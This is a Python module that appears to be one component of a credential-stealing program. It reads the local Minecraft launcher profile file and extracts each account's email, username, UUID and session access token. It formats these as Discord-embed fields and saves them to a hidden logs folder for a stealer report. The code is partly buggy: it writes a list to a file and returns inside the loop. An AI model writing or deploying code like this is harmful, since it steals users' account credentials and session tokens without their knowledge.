from json import loads
from os import getenv,makedirs,environ
from manager.logger import Log
from preferences.config import config

def uuid_dashed(uuid):
    return f"{uuid[0:8]}-{uuid[8:12]}-{uuid[12:16]}-{uuid[16:21]}-{uuid[21:32]}"

def Minecraft():
    try:
        msgInfo = ""
        auth_db = loads(open(getenv("APPDATA") + "\\.minecraft\\launcher_profiles.json").read())["authenticationDatabase"]
        logs = []
        for x in auth_db:
            try:
                email = auth_db[x].get("username")
                uuid, display_name_object = list(auth_db[x]["profiles"].items())[0]
                log = {
                    "fields": [
                        {"name": "Email", "value": email if email and "@" in email else "N/A", "inline": False},
                        {"name": "Username", "value": display_name_object["displayName"].replace("_", "\\_"), "inline": True},
                        {"name": "UUID", "value": uuid_dashed(uuid), "inline": True},
                        {"name": "Token", "value": auth_db[x]["accessToken"], "inline": True}
                        ]
                }
                logs.append(log)
                user = environ['USERPROFILE']
                pathtofile = f'{user}\\{config.pathToLogs}'
                try:
                    makedirs(f'{pathtofile}\\Games\\Minecraft')
                    with open(f'{pathtofile}\\Games\\Minecraft\\session.txt',"w") as file:
                        file.write(logs)
                    msgInfo+="\n∟🎮Minecraft"
                    return msgInfo
                except Exception as e:
                    Log(f"Minecraft(write) ---> {e}")
            except Exception as e:
                Log(f"Minecraft({x}) ---> {e}")
    except Exception as e:
        Log(f"Minecraft(global) ---> {e}")
        return msgInfo